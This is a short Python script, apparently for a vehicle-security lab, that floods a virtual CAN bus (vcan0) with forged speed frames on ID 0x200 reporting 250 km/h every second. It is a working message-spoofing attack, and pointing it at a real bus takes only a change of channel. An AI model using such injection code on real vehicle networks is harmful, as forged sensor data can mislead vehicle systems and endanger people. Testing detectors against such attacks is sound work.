import can
import time

CAN_ID = 0x200

bus = can.Bus(
    interface="socketcan",
    channel="vcan0"
)

print("=" * 60)
print(" INVALID VEHICLE SPEED ATTACK SIMULATOR")
print("=" * 60)
print()
print("Target CAN ID : 0x200")
print("Fake Speed    : 250 km/h")
print("Maximum Speed : 120 km/h")
print()
print("Press CTRL+C to stop.")
print("=" * 60)
print()

try:
    while True:

        speed = 250

        speed_data = speed.to_bytes(
            2,
            byteorder="big"
        )

        message = can.Message(
            arbitration_id=CAN_ID,
            data=speed_data,
            is_extended_id=False
        )

        bus.send(message)

        print(
            f"ATTACK -> Speed={speed} km/h"
        )

        time.sleep(1)

except KeyboardInterrupt:

    print()
    print("Invalid speed attack stopped.")

finally:

    bus.shutdown()
